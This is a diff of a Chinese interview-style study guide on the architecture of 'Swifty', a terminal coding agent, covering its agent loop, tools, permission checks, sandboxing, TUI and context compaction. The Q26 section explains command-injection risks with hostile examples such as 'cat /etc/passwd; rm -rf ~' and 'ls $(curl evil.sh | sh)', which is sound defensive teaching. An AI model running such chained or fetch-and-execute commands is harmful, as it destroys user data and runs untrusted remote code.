@@ -12,9 +12,7 @@ protected: true
 
 ## 一、项目整体架构与设计决策
 
-### Q1: 请用几句话描述 Swifty 的整体架构, 并说明它与普通 CLI 工具的本质区别是什么?
-
-答:
+### 请用几句话描述 Swifty 的整体架构, 并说明它与普通 CLI 工具的本质区别是什么?
 
 Swifty 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 而在于它实现了一个 LLM 驱动的自治循环( Agent Loop) : 普通 CLI 是"用户输入 → 程序执行 → 输出"的一次性映射, 而 Swifty 是"用户目标 → LLM 推理 → 调用工具 → 观察结果 → 再推理"的多轮闭环, 直到任务完成.
 
@@ -31,9 +29,7 @@ Swifty 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 
 
 ---
 
-### Q2: 为什么 Agent 循环要用 `AsyncGenerator` 而不是 EventEmitter 或回调? 这在架构上带来了什么好处?
-
-答:
+### 为什么 Agent 循环要用 `AsyncGenerator` 而不是 EventEmitter 或回调? 这在架构上带来了什么好处?
 
 这是一个关键的技术选型. `agent.run()` 的签名是 `AsyncGenerator<AgentEvent>`, 消费侧统一为 `for await (const event of agent.run())`( `tui/app.tsx:1542`) . 相比 EventEmitter/回调, AsyncGenerator 带来四个结构性优势:
 
@@ -46,9 +42,7 @@ Swifty 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 
 
 ---
 
-### Q3: 项目中 AgentEvent 是如何建模的? 为什么用 discriminated union 而不是类继承?
-
-答:
+### 项目中 AgentEvent 是如何建模的? 为什么用 discriminated union 而不是类继承?
 
 `src/agent/events.ts` 定义了 12 个成员的判别联合( discriminated union) :
 
@@ -74,9 +68,7 @@ Swifty 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 
 
 ---
 
-### Q4: Swifty 的 TUI 选择了 Ink( React for CLI) 而不是 Blessed/Ratatui 这类方案, 你认为这个决策的权衡是什么? React 模型在终端里带来了什么独特能力?
-
-答:
+### Swifty 的 TUI 选择了 Ink( React for CLI) 而不是 Blessed/Ratatui 这类方案, 你认为这个决策的权衡是什么? React 模型在终端里带来了什么独特能力?
 
 Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 Swifty 恰恰是一个 UI 复杂度极高的终端程序( 流式文本、工具进度、权限对话框、计划审批、团队进度树、斜杠命令自动补全) . 权衡如下:
 
@@ -97,9 +89,7 @@ Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 
 
 ---
 
-### Q5: 项目的系统提示词( System Prompt) 是如何组织的? 这种"分段组装"的设计解决了什么问题?
-
-答:
+### 项目的系统提示词( System Prompt) 是如何组织的? 这种"分段组装"的设计解决了什么问题?
 
 `src/prompt/builder.ts` 实现了 PromptBuilder 模式: 系统提示词不是一个巨字符串, 而是一组带优先级的"段落( Section) ", 按优先级排序后拼接( `buildSystemPrompt()`, builder.ts:97-107, 共 8 个段落) :
 
@@ -125,9 +115,7 @@ Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 
 
 ---
 
-### Q6: Swifty 的四种运行模式( TUI / print / remote / teammate) 如何复用同一套核心逻辑? 这种设计对可测试性有什么意义?
-
-答:
+### Swifty 的四种运行模式( TUI / print / remote / teammate) 如何复用同一套核心逻辑? 这种设计对可测试性有什么意义?
 
 复用的关键是 Agent 核心只依赖注入的接口, 不依赖宿主环境:
 
@@ -150,9 +138,7 @@ main.tsx ──┬── TUI      → Ink <App>, 消费 AgentEvent → React sta
 
 ## 二、Agent 核心循环与异步迭代
 
-### Q7: 请完整描述 Agent 循环 `run()` 的单轮迭代流程.
-
-答:
+### 请完整描述 Agent 循环 `run()` 的单轮迭代流程.
 
 `src/agent/agent.ts` 的 `run()` 是一个 `while (looping)` 循环( 起于 line 174, 循环体在 line 189) , 单轮迭代按严格顺序执行:
 
@@ -173,9 +159,7 @@ main.tsx ──┬── TUI      → Ink <App>, 消费 AgentEvent → React sta
 
 ---
 
-### Q8: 工具调用的"分批并行"是如何实现的? 为什么 read 类工具可以并行而 write/command 不行?
-
-答:
+### 工具调用的"分批并行"是如何实现的? 为什么 read 类工具可以并行而 write/command 不行?
 
 实现分两层:
 
@@ -207,9 +191,7 @@ for (const tu of toolUses) {
 
 ---
 
-### Q9: Agent 循环有哪些"自愈"机制? 请分别说明触发条件与恢复策略.
-
-答:
+### Agent 循环有哪些"自愈"机制? 请分别说明触发条件与恢复策略.
 
 Swifty 有三类自愈机制, 都在 `agent.ts` 中:
 
@@ -234,9 +216,7 @@ Swifty 有三类自愈机制, 都在 `agent.ts` 中:
 
 ---
 
-### Q10: `turn_complete` 与 `loop_complete` 两个事件的边界语义是什么? UI 如何利用这个边界?
-
-答:
+### `turn_complete` 与 `loop_complete` 两个事件的边界语义是什么? UI 如何利用这个边界?
 
 - turn( 轮) : 一次 LLM 响应 + 其引发的全部工具执行. 一个用户提问通常包含多个 turn( 模型调工具 → 看结果 → 再调工具) .
 - loop( 循环) : 从用户提问到 Agent 彻底完成( 模型不再调用工具) 的整个过程.
@@ -260,9 +240,7 @@ Swifty 有三类自愈机制, 都在 `agent.ts` 中:
 
 ---
 
-### Q11: Agent 循环里为什么要维护 `streamingTextRef` 这样的"可变 ref 镜像"? 直接用 state 会有什么问题?
-
-答:
+### Agent 循环里为什么要维护 `streamingTextRef` 这样的"可变 ref 镜像"? 直接用 state 会有什么问题?
 
 这是 React 异步回调中的经典陈旧闭包( stale closure) 问题. Agent 事件循环是一个长生命周期的 `for await` 循环( `app.tsx:1542`) , 它持有的回调闭包捕获的是循环开始时的 state 快照. 以流式文本为例:
 
@@ -284,9 +262,7 @@ case "stream_text":
 
 ---
 
-### Q12: 权限确认是一个"需要等待用户输入"的交互, 而 Agent 循环是一个生成器 —— 二者如何协作? 请解释 Promise 悬挂模式.
-
-答:
+### 权限确认是一个"需要等待用户输入"的交互, 而 Agent 循环是一个生成器 —— 二者如何协作? 请解释 Promise 悬挂模式.
 
 Swifty 用 Promise-based suspension( Promise 悬挂) 把"同步阻塞等待用户"桥接进异步生成器:
 
@@ -306,9 +282,7 @@ Swifty 用 Promise-based suspension( Promise 悬挂) 把"同步阻塞等待用�
 
 ---
 
-### Q13: Agent 如何防止"工具调用死循环"( 模型反复调用工具永不停止) ?
-
-答:
+### Agent 如何防止"工具调用死循环"( 模型反复调用工具永不停止) ?
 
 多层防线:
 
@@ -324,9 +298,7 @@ Swifty 用 Promise-based suspension( Promise 悬挂) 把"同步阻塞等待用�
 
 ## 三、LLM 抽象层与流式协议
 
-### Q14: `LLMClient` 接口是如何设计的? 三套协议( anthropic / openai / openai-compat) 的差异被如何收敛?
-
-答:
+### `LLMClient` 接口是如何设计的? 三套协议( anthropic / openai / openai-compat) 的差异被如何收敛?
 
 接口极简化( `llm/client.ts`) :
 
@@ -355,9 +327,7 @@ interface LLMClient {
 
 ---
 
-### Q15: Prompt Caching 是如何实现的? 三个缓存断点分别放在哪里、为什么?
-
-答:
+### Prompt Caching 是如何实现的? 三个缓存断点分别放在哪里、为什么?
 
 Anthropic 的 prompt caching 按前缀匹配计费优化 —— 从消息开头到 `cache_control` 断点处的内容若与上次请求一致, 则命中缓存( cache read 价格约为原价的 1/10) . Swifty 在 `anthropic.ts` 设了三个断点, 位置选择体现"稳定性递减"原则:
 
@@ -371,9 +341,7 @@ Anthropic 的 prompt caching 按前缀匹配计费优化 —— 从消息开头�
 
 ---
 
-### Q16: `buildAnthropicMessages()` 中"user 消息合并"是什么机制? 解决什么问题?
-
-答:
+### `buildAnthropicMessages()` 中"user 消息合并"是什么机制? 解决什么问题?
 
 Anthropic API 要求消息严格 user/assistant 交替 —— 连续两条同角色消息会被拒绝. 但 Swifty 内部有多种场景会产生连续 user 消息:
 
@@ -387,9 +355,7 @@ Anthropic API 要求消息严格 user/assistant 交替 —— 连续两条同角
 
 ---
 
-### Q17: LLM 层的错误分类体系是怎样的? 为什么要把错误分类做得这么细?
-
-答:
+### LLM 层的错误分类体系是怎样的? 为什么要把错误分类做得这么细?
 
 `llm/errors.ts` 定义了继承体系:
 
@@ -414,9 +380,7 @@ LLMError
 
 ---
 
-### Q18: `UsageAnchor`( 用量锚点) 机制是如何工作的? 它解决了 token 估算的什么痛点?
-
-答:
+### `UsageAnchor`( 用量锚点) 机制是如何工作的? 它解决了 token 估算的什么痛点?
 
 痛点: 上下文压缩需要知道"当前对话占多少 token", 但本地无法精确计算( 不同模型的 tokenizer 不同) . 纯字符估算( `chars / 3.5`) 误差大 —— 中文、代码、base64 的字符/token 比差异悬殊, 误差累积会导致"过早压缩( 浪费) "或"过晚压缩( 爆上下文) ".
 
@@ -442,9 +406,7 @@ currentTokens = baselineTokens + estimateMessages(history.slice(anchorCount))
 
 ---
 
-### Q19: 工具 schema 在不同协议间如何转换? `ToolSchema` 上有哪些值得注意的扩展字段?
-
-答:
+### 工具 schema 在不同协议间如何转换? `ToolSchema` 上有哪些值得注意的扩展字段?
 
 内部统一为 `ToolSchema`( JSON Schema 风格: `{ name, description, input_schema: { type:"object", properties, required } }`) , 出站时按协议转换:
 
@@ -465,9 +427,7 @@ currentTokens = baselineTokens + estimateMessages(history.slice(anchorCount))
 
 ## 四、工具系统与延迟加载
 
-### Q20: 工具接口是如何设计的? `category` 字段为什么是整个系统的枢纽?
-
-答:
+### 工具接口是如何设计的? `category` 字段为什么是整个系统的枢纽?
 
 `tools/types.ts` 中的核心接口:
 
@@ -494,9 +454,7 @@ interface Tool {
 
 ---
 
-### Q21: 什么是延迟工具( deferred tool) 机制? 它如何解决"工具过多导致上下文膨胀"的问题?
-
-答:
+### 什么是延迟工具( deferred tool) 机制? 它如何解决"工具过多导致上下文膨胀"的问题?
 
 问题背景: MCP 服务器可能暴露数十上百个工具, 若全部 schema 注入系统提示, 一次请求的工具描述就能吃掉数万 token, 还会稀释模型对核心工具的注意力.
 
@@ -512,9 +470,7 @@ interface Tool {
 
 ---
 
-### Q22: `fileStateCache` 的"先读后写"门禁是如何实现的? 它防御的是什么问题?
-
-答:
+### `fileStateCache` 的"先读后写"门禁是如何实现的? 它防御的是什么问题?
 
 `tools/file-state-cache.ts` 维护 `Map<path, mtimeMs>` —— 记录每个文件"最后被本会话读取时的修改时间":
 
@@ -535,9 +491,7 @@ interface Tool {
 
 ---
 
-### Q23: EditFile 的 diff 是如何生成的? 为什么没有直接用 Myers/LCS 这类通用 diff 算法?
-
-答:
+### EditFile 的 diff 是如何生成的? 为什么没有直接用 Myers/LCS 这类通用 diff 算法?
 
 `tools/diff.ts` 用的是公共前后缀裁剪法, 而非通用 diff:
 
@@ -556,9 +510,7 @@ interface Tool {
 
 ---
 
-### Q24: Bash 工具是如何执行命令的? 为什么必须用异步 API 而不是同步?
-
-答:
+### Bash 工具是如何执行命令的? 为什么必须用异步 API 而不是同步?
 
 `tools/bash.ts` 用异步 `execFile("bash", ["-c", command], { timeout, killSignal: "SIGTERM", maxBuffer: 10MB })` 包在 Promise 里执行. 源码注释记录了这段演进史: 最初用同步执行, 结果在整条命令执行期间 TUI 冻结( spinner 动画、elapsed 计时器、键盘输入全部卡死) ; 换成异步执行后 Node 事件循环保持空闲, UI 才能继续响应.
 
@@ -582,9 +534,7 @@ interface Tool {
 
 ## 五、权限系统与 OS 沙箱
 
-### Q25: 权限检查器( PermissionChecker) 的分层决策管线是怎样的? 请按优先级逐层说明.
-
-答:
+### 权限检查器( PermissionChecker) 的分层决策管线是怎样的? 请按优先级逐层说明.
 
 `permissions/checker.ts` 的 `check()` 是一条短路求值的分层管线, 靠前的层更具体、更优先:
 
@@ -601,9 +551,7 @@ interface Tool {
 
 ---
 
-### Q26: `isSafeCommand()` 的"元字符守卫"是什么? 为什么单纯的前缀匹配不安全?
-
-答:
+### `isSafeCommand()` 的"元字符守卫"是什么? 为什么单纯的前缀匹配不安全?
 
 朴素方案是"命令前缀白名单": `ls`、`cat`、`git status` 等开头即放行. 但这有经典注入漏洞 —— `cat /etc/passwd; rm -rf ~` 以 `cat` 开头却执行任意命令; `ls $(curl evil.sh | sh)` 同理.
 
@@ -618,9 +566,7 @@ interface Tool {
 
 ---
 
-### Q27: 权限模式( permission mode) 有哪几种? 各自语义与典型使用场景是什么?
-
-答:
+### 权限模式( permission mode) 有哪几种? 各自语义与典型使用场景是什么?
 
 四种模式构成严格度梯度, TUI 中 Shift+Tab 循环切换( `MODEL_CYCLE = ["default", "acceptEdits", "plan", "bypassPermissions"]`) :
 
@@ -640,9 +586,7 @@ interface Tool {
 
 ---
 
-### Q28: OS 级沙箱是如何实现的? macOS seatbelt 与 Linux bubblewrap 的差异如何收敛?
-
-答:
+### OS 级沙箱是如何实现的? macOS seatbelt 与 Linux bubblewrap 的差异如何收敛?
 
 `sandbox/index.ts` 定义统一接口 `Sandbox { available(): boolean; wrap(command, config): string }`, 工厂 `createSandbox()` 按平台返回实现, `wrap()` 的职责是把原始命令包装成沙箱化命令字符串( bash 工具执行前调用) :
 
@@ -658,9 +602,7 @@ interface Tool {
 
 ---
 
-### Q29: 延伸思考: "如果让你设计这个权限系统的下一步演进, 你会做什么? " 如何回答才体现深度?
-
-答:
+### 延伸思考: "如果让你设计这个权限系统的下一步演进, 你会做什么? " 如何回答才体现深度?
 
 可以从五个方向展开, 每个都对应现有设计的真实局限:
 
@@ -676,9 +618,7 @@ interface Tool {
 
 ## 六、TUI 渲染层与性能优化
 
-### Q30: Ink 的 `<Static>` 组件在 Swifty 中扮演什么角色? 消息是如何"提交"到不可变区域的?
-
-答:
+### Ink 的 `<Static>` 组件在 Swifty 中扮演什么角色? 消息是如何"提交"到不可变区域的?
 
 终端渲染有个根本约束: 已滚出可视区的内容无法再修改( 终端不是 DOM, 没有真正的重绘已滚动区域的能力) . Ink 的 `<Static>` 正是为此设计: 其子树渲染一次后写入终端回滚缓冲区( scrollback) , 之后任何 React 更新都不再触碰它, 也不参与 `eraseLines` 清屏.
 
@@ -718,9 +658,7 @@ Swifty 将全部消息传入 `<Static>` 的 items 数组( `app.tsx:1930-1944`) :
 
 ---
 
-### Q31: 流式文本的 50ms 节流具体如何实现? 为什么不直接用 lodash throttle 或 React 18 的 `useDeferredValue`?
-
-答:
+### 流式文本的 50ms 节流具体如何实现? 为什么不直接用 lodash throttle 或 React 18 的 `useDeferredValue`?
 
 实现( `app.tsx:1544-1551`) :
 
@@ -746,9 +684,7 @@ case "stream_text":
 
 ---
 
-### Q32: `StreamingText` 组件的"稳定前缀缓存"是什么? 它把 markdown 解析的复杂度从多少降到多少?
-
-答:
+### `StreamingText` 组件的"稳定前缀缓存"是什么? 它把 markdown 解析的复杂度从多少降到多少?
 
 问题: 流式渲染要对文本做 markdown 解析( `marked`) , 若每帧全量解析累计文本, 第 n 帧成本 O(n), 总成本 O(n²) —— 长回复后半段会明显卡顿.
 
@@ -777,9 +713,7 @@ const fullRendered = stableRef.current.rendered + renderMarkdown(unstableText);
 
 ---
 
-### Q33: `app.tsx` 约 2150 行、70+ 个 `useState`/`useRef`, 是如何避免变成"巨石组件"失控的? 它的状态分层策略是什么?
-
-答:
+### `app.tsx` 约 2150 行、70+ 个 `useState`/`useRef`, 是如何避免变成"巨石组件"失控的? 它的状态分层策略是什么?
 
 `app.tsx` 的状态可清晰分为五层, 这是它没有失控的根本原因:
 
@@ -795,9 +729,7 @@ const fullRendered = stableRef.current.rendered + renderMarkdown(unstableText);
 
 ---
 
-### Q34: 输入框( InputBox) 在 Ink 里是如何从零实现的? 包括光标、多行、历史、自动补全.
-
-答:
+### 输入框( InputBox) 在 Ink 里是如何从零实现的? 包括光标、多行、历史、自动补全.
 
 Ink 没有 `<input>` 组件, `input.tsx`( 795 行) 基于 `useInput` 原始按键事件自建了微型文本编辑器:
 
@@ -815,9 +747,7 @@ Ink 没有 `<input>` 组件, `input.tsx`( 795 行) 基于 `useInput` 原始按�
 
 ---
 
-### Q35: `installSyncOutput()` 做了什么? 终端"撕裂"问题与浏览器的 vsync 有什么类比?
-
-答:
+### `installSyncOutput()` 做了什么? 终端"撕裂"问题与浏览器的 vsync 有什么类比?
 
 终端撕裂: Ink 每帧输出包含"光标定位 + 擦除 + 重写"多段 ANSI 序列, 若终端模拟器在序列写到一半时刷新屏幕, 用户会看到半新半旧的中间帧( 闪烁/撕裂) .
 
@@ -841,9 +771,7 @@ if (!scheduled) {
 
 ---
 
-### Q36: 权限对话框、提问向导、计划审批这些交互组件, 在键盘交互设计上有哪些共性模式?
-
-答:
+### 权限对话框、提问向导、计划审批这些交互组件, 在键盘交互设计上有哪些共性模式?
 
 三个对话框体现了终端键盘交互的统一模式语言:
 
@@ -856,9 +784,7 @@ if (!scheduled) {
 
 ---
 
-### Q37: 团队/子代理的实时进度在 UI 上如何呈现? 为什么团队状态用轮询而不是事件驱动?
-
-答:
+### 团队/子代理的实时进度在 UI 上如何呈现? 为什么团队状态用轮询而不是事件驱动?
 
 两条路径:
 
@@ -875,9 +801,7 @@ if (!scheduled) {
 
 ---
 
-### Q38: 延伸思考:"这个 TUI 还有哪些性能隐患, 你会怎么优化? ", 可以从哪些点展开?
-
-答:
+### 延伸思考:"这个 TUI 还有哪些性能隐患, 你会怎么优化? ", 可以从哪些点展开?
 
 基于已有实现, 可讨论的点:
 
@@ -894,9 +818,7 @@ if (!scheduled) {
 
 ## 七、上下文管理与压缩
 
-### Q39: 上下文管理的"两道防线"是什么? 为什么预算落盘在前、compact 在后?
-
-答:
+### 上下文管理的"两道防线"是什么? 为什么预算落盘在前、compact 在后?
 
 膨胀源治理分两级, 关键是预算处理的时机 —— 它不在每轮调 LLM 前做, 而在工具结果"入历史时"完成( `agent.ts:503-541`) . agent.ts 注释写明 "Tool results are already budget-processed at the time they enter history", 因此 transcript 中的消息尺寸即终态, 后续压缩阈值估算可直接基于它们.
 
@@ -914,9 +836,7 @@ if (!scheduled) {
 
 ---
 
-### Q40: 压缩( compact) 算法完整流程是怎样的? 保留尾部、摘要、恢复三件套如何协同?
-
-答:
+### 压缩( compact) 算法完整流程是怎样的? 保留尾部、摘要、恢复三件套如何协同?
 
 触发阈值( `computeCompactThreshold()`) :
 
@@ -942,9 +862,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q41: token 估算为什么用 `chars / 3.5`? 这个数字的误差如何处理?
-
-答:
+### token 估算为什么用 `chars / 3.5`? 这个数字的误差如何处理?
 
 `CHARS_PER_TOKEN = 3.5`( `compact.ts:56`) 是英文代码/文本混合语料下 Claude tokenizer 的经验均值( 英文约 4, 代码符号密集略低, 取保守值使估算偏大而宁早勿晚) .
 
@@ -960,9 +878,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q42: 压缩如何与会话持久化配合实现"可恢复的会话"? `compact_boundary` 是什么?
-
-答:
+### 压缩如何与会话持久化配合实现"可恢复的会话"? `compact_boundary` 是什么?
 
 会话以 JSONL 追加写持久化( `.swifty/sessions/{id}.jsonl`, 每行一个 `SessionMessage`) . 压缩发生时追加一条特殊记录:
 
@@ -986,9 +902,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q43: 超大工具结果"落盘 + 预览"机制中, `isSpillReadback()` 防御的无限循环具体是什么场景?
-
-答:
+### 超大工具结果"落盘 + 预览"机制中, `isSpillReadback()` 防御的无限循环具体是什么场景?
 
 场景还原:
 
@@ -1002,9 +916,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q44: 如何解释"为什么纯摘要式压缩不够好", 你会怎么论证 Swifty 的三件套方案?
-
-答:
+### 如何解释"为什么纯摘要式压缩不够好", 你会怎么论证 Swifty 的三件套方案?
 
 论证结构:
 
@@ -1020,9 +932,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ## 八、会话持久化、记忆与钩子
 
-### Q45: 文件历史( FileHistory) 与 `/rewind` 回滚是如何实现的? 为什么备份键用 `sha256(path)` 而不是路径本身?
-
-答:
+### 文件历史( FileHistory) 与 `/rewind` 回滚是如何实现的? 为什么备份键用 `sha256(path)` 而不是路径本身?
 
 机制( `file-history/file-history.ts`) :
 
@@ -1041,9 +951,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q46: 记忆系统( Memory) 的三层结构是什么? LLM 召回与自动提取分别怎么工作?
-
-答:
+### 记忆系统( Memory) 的三层结构是什么? LLM 召回与自动提取分别怎么工作?
 
 存储层: 两级目录 —— 用户级 `~/.swifty/memory/`( 跨项目: 用户偏好、反馈) 与项目级 `{workDir}/.swifty/memory/`( 项目知识、参考) . 每条记忆是一个带 YAML frontmatter( name/type/description) 的 `.md` 文件. `MEMORY.md` 是自动生成的索引( `- [name](path) -- description` 每行一条, 上限 200 行 / 25KB) .
 
@@ -1057,9 +965,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q47: Hook 系统的事件与动作模型是怎样的? `reject`、`once`、`async` 三个标志各自解决什么问题?
-
-答:
+### Hook 系统的事件与动作模型是怎样的? `reject`、`once`、`async` 三个标志各自解决什么问题?
 
 事件( 9 个生命周期点) : `session_start/end`、`turn_start/end`、`pre_send/post_receive`、`pre_tool_use/post_tool_use`、`shutdown` —— 覆盖了"会话-轮-请求-工具"四个粒度.
 
@@ -1082,9 +988,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 ---
 
-### Q48: 会话持久化选用 JSONL 追加写而不是 SQLite/单文件 JSON, 权衡是什么?
-
-答:
+### 会话持久化选用 JSONL 追加写而不是 SQLite/单文件 JSON, 权衡是什么?
 
 JSONL( 每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
@@ -1100,9 +1004,7 @@ JSONL( 每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
 ---
 
-### Q49: 系统里有哪些"非阻塞化"设计? 请归纳 Swifty 处理慢操作的整体策略.
-
-答:
+### 系统里有哪些"非阻塞化"设计? 请归纳 Swifty 处理慢操作的整体策略.
 
 慢操作清单及其非阻塞化手段:
 
@@ -1130,9 +1032,7 @@ JSONL( 每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
 ## 九、多智能体、技能与 MCP
 
-### Q50: 子代理( Subagent) 系统如何设计? 内置三种代理的分工与工具过滤机制是什么?
-
-答:
+### 子代理( Subagent) 系统如何设计? 内置三种代理的分工与工具过滤机制是什么?
 
 定义层( `subagent/definition.ts`) : `AgentDefinition` 声明 name/description、工具白/黑名单、systemPromptOverride、maxTurns、model、permissionMode、isolation( worktree) 等. 内置三种:
 
@@ -1150,9 +1050,7 @@ JSONL( 每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
 ---
 
-### Q51: 团队( Teams) 多智能体协作的通信机制是什么? 文件邮箱协议如何工作?
-
-答:
+### 团队( Teams) 多智能体协作的通信机制是什么? 文件邮箱协议如何工作?
 
 拓扑: lead( 主代理) + 若干 teammate( 后台代理进程/协程) , 星型通信 —— teammate 只与 lead 通信, 不互相对话, 降低协调复杂度.
 
@@ -1172,9 +1070,7 @@ lead 侧感知: `TeamManager.drainLeads()` 把各邮箱未读消息包装为 `<t
 
 ---
 
-### Q52: 技能( Skill) 系统的 inline 与 fork 两种执行模式有什么区别? 技能加载的目录扫描顺序为何设计成这样?
-
-答:
+### 技能( Skill) 系统的 inline 与 fork 两种执行模式有什么区别? 技能加载的目录扫描顺序为何设计成这样?
 
 技能格式: 目录 + `SKILL.md`( YAML frontmatter: `name/description/allowed_tools/mode/model/fork_context`) .
 
@@ -1199,9 +1095,7 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 ---
 
-### Q53: MCP( Model Context Protocol) 是如何接入的? 为什么 MCP 工具默认 deferred?
-
-答:
+### MCP( Model Context Protocol) 是如何接入的? 为什么 MCP 工具默认 deferred?
 
 接入链( `mcp/manager.ts` → `client.ts` → `tool-wrapper.ts`) :
 
@@ -1220,9 +1114,7 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 ---
 
-### Q54: 对比"子代理 fork / 技能 fork / 团队 teammate"三种并发形态, 各自的适用场景与设计取舍是什么?
-
-答:
+### 对比"子代理 fork / 技能 fork / 团队 teammate"三种并发形态, 各自的适用场景与设计取舍是什么?
 
 | 维度     | 子代理 (Agent tool)       | 技能 fork                      | 团队 teammate                     |
 | -------- | ------------------------- | ------------------------------ | --------------------------------- |
@@ -1245,9 +1137,7 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 ## 十、工程化: 构建、测试与配置
 
-### Q55: 构建系统( tsup) 有哪些针对 CLI 产物的特殊处理? 为什么要 `noExternal: [/.*/]`?
-
-答:
+### 构建系统( tsup) 有哪些针对 CLI 产物的特殊处理? 为什么要 `noExternal: [/.*/]`?
 
 `tsup.config.ts` 的关键决策:
 
@@ -1262,9 +1152,7 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 ---
 
-### Q56: 配置系统的多层合并策略是什么? context window 的四级解析体现什么设计思想?
-
-答:
+### 配置系统的多层合并策略是什么? context window 的四级解析体现什么设计思想?
 
 合并( `config.ts`, `loadConfig()` 的 3 个候选文件按序叠加, config.ts:449-453) : `~/.swifty/config.yaml` → `{cwd}/.swifty/config.yaml` → `{cwd}/.swifty/config.local.yaml`. 合并规则按字段类型定制:
 
@@ -1286,9 +1174,7 @@ context window 四级解析( `getContextWindowAsync()`) :
 
 ---
 
-### Q57: 项目的测试策略是怎样的? 40+ 测试文件覆盖了哪些关键面? E2E 怎么做?
-
-答:
+### 项目的测试策略是怎样的? 40+ 测试文件覆盖了哪些关键面? E2E 怎么做?
 
 Vitest v4( v8 coverage) , 测试分层( `tests/`, 42 个测试文件) :
 
@@ -1310,9 +1196,7 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 
 ---
 
-### Q58: 从这个项目中可以提炼出哪些可迁移到其他领域的架构经验?
-
-答:
+### 从这个项目中可以提炼出哪些可迁移到其他领域的架构经验?
 
 提炼七条( 可按兴趣展开) :
 
@@ -1330,9 +1214,7 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 
 ## 十一、入口与运行模式深挖
 
-### Q59: print 模式( `-p`) 的 `stream-json` 输出协议是如何设计的? 为什么它选择"事件不落盘、统计在尾部"?
-
-答:
+### print 模式( `-p`) 的 `stream-json` 输出协议是如何设计的? 为什么它选择"事件不落盘、统计在尾部"?
 
 `print-mode.ts` 把 Agent 事件流映射为每行一个 JSON 对象( NDJSON) 输出到 stdout, 供脚本/CI 管道消费. 协议设计( `emitStreamJson()`, print-mode.ts:301) :
 
@@ -1361,9 +1243,7 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 
 ---
 
-### Q60: teammate 子进程模式( `--teammate`) 的完整生命周期是怎样的? 它与其他模式的关键差异是什么?
-
-答:
+### teammate 子进程模式( `--teammate`) 的完整生命周期是怎样的? 它与其他模式的关键差异是什么?
 
 `teammate.ts` 是一个无 UI、邮箱驱动的长驻 Agent 进程. 生命周期( `runTeammate()`) :
 
@@ -1389,9 +1269,7 @@ teammate 的本质是"Agent 即服务( 进程) ": lead 通过写邮箱下发任�
 
 ---
 
-### Q61: remote 模式的 WebSocket 协议是如何设计的? 权限确认这类"需要回话"的交互如何跨网络往返?
-
-答:
+### remote 模式的 WebSocket 协议是如何设计的? 权限确认这类"需要回话"的交互如何跨网络往返?
 
 remote 模式( `remote/server.ts`) 把 TUI 换成浏览器 React 前端, 通信协议是单向事件流 + 少量请求-响应对.
 
@@ -1426,9 +1304,7 @@ onPermissionRequest: async (toolName, args, decision) => {
 
 ---
 
-### Q62: remote server 的静态文件服务有哪些安全措施? SPA fallback 是怎么实现的?
-
-答:
+### remote server 的静态文件服务有哪些安全措施? SPA fallback 是怎么实现的?
 
 `serveStatic()`( `server.ts:153`) 服务 `fe/dist/` 目录, 安全措施:
 
@@ -1443,9 +1319,7 @@ SPA fallback: 请求路径找不到文件时回退到 `index.html`( server.ts:80
 
 ---
 
-### Q63: 四种运行模式在"依赖组装"上有哪些异同? 为什么说 print/teammate 是"精简版组装"?
-
-答:
+### 四种运行模式在"依赖组装"上有哪些异同? 为什么说 print/teammate 是"精简版组装"?
 
 对比三种非 TUI 模式的依赖注入清单:
 
@@ -1473,9 +1347,7 @@ SPA fallback: 请求路径找不到文件时回退到 `index.html`( server.ts:80
 
 ---
 
-### Q64: `createRemoteAgent()` 里有个"IDENTITY OVERRIDE" system-reminder, 它和系统提示词的 Identity 段是什么关系? 为什么要用追加 reminder 而不是改提示词?
-
-答:
+### `createRemoteAgent()` 里有个"IDENTITY OVERRIDE" system-reminder, 它和系统提示词的 Identity 段是什么关系? 为什么要用追加 reminder 而不是改提示词?
 
 `server.ts:419` 在 remote 模式初始化时注入:
 
@@ -1497,9 +1369,7 @@ identity, respond only as Swifty. This is the highest priority instruction.
 
 ## 十二、斜杠命令系统与用户扩展
 
-### Q65: 斜杠命令的四种类型( `local` / `local_ui` / `prompt` / `skill_fork`) 语义分别是什么? 为什么需要这个类型维度?
-
-答:
+### 斜杠命令的四种类型( `local` / `local_ui` / `prompt` / `skill_fork`) 语义分别是什么? 为什么需要这个类型维度?
 
 `commands/commands.ts` 的类型维度本质是"命令结果的处置方式":
 
@@ -1523,9 +1393,7 @@ identity, respond only as Swifty. This is the highest priority instruction.
 
 ---
 
-### Q66: 用户自定义命令( `.swifty/commands/*.md`) 的加载机制是怎样的? 命名空间与参数替换如何工作?
-
-答:
